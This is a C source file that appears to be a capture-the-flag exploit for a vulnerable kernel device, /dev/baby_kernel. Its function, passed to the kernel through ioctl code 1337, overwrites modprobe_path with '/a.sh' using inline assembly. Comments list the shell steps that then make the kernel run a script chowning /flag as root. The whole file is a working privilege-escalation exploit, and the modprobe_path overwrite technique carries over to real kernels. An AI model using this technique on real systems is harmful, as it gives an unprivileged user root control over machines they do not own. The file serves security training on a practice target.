#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define MODPROBE_PATH   0xffffffff82851660

// Writing into modprobe #!/bin/sh
void shellcode_4()
{
    asm volatile (
        "mov rdi, %0\n"
        "mov rsi, 0x68732e612f\n" // 0x68732e612f is "/a.sh" in hex little endian, found with ipython b"/a.sh"[::-1].hex()
        "mov qword ptr [rdi], rsi\n"
        :
        : "r"(MODPROBE_PATH)
        : "rdi"
    );
}

// After running this exploit we have to create the file /a.sh, write #!/bin/sh into it with and execute it:
//      echo -ne "\x00" > b
//      echo "#!/bin/sh" >> a.sh
//      echo "" >> a.sh
//      echo "/bin/chown 1000:1000 /flag" >> a.sh
//      chmod +x b
//      chmod +x a.sh
//      ./b
int main()
{
    int fd;
    char buf[100];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    fd = open("/dev/baby_kernel", O_RDWR);

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    printf("File opened: fd = %d\n", fd);
    ioctl(fd, 1337, shellcode_4);
    close(fd);

    return 0;
}